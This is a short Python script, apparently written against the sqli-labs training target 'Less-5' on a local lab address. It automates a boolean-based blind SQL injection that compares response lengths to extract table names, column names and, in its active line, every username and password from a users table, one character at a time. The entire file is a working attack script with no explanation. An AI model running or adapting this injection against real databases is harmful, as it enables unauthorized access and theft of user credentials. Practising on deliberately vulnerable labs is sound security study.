#coding:utf-8
import requests

namelen = 1024
char = "abcdefghijklmnopqrstuvwxyz~*,/\{}?!:@_-1234567890"

res = requests.get("http://10.0.2.15/sqli/Less-5/?id=1")
truelen = len(res.content)

name = ""
for i in range(1, namelen):
    flag = True
    for str in char:
	#res = requests.get("http://10.0.2.15/sqli/Less-5/?id=1' and mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),%s,1)=%%27%s%%27--+"%(i,str))
	#res = requests.get("http://10.0.2.15/sqli/Less-5/?id=1' and mid((select group_concat(column_name) from information_schema.columns where table_name = 'users'),%s,1)=%%27%s%%27--+"%(i,str))
	res = requests.get("http://10.0.2.15/sqli/Less-5/?id=1' and mid((select group_concat(username,0x3a,password) from users),%s,1)=%%27%s%%27--+"%(i,str))
	if ( len(res.content) == truelen):
	    name += str
	    flag = False
	    print(name)
	    break
    if(flag):break
print(name)
	

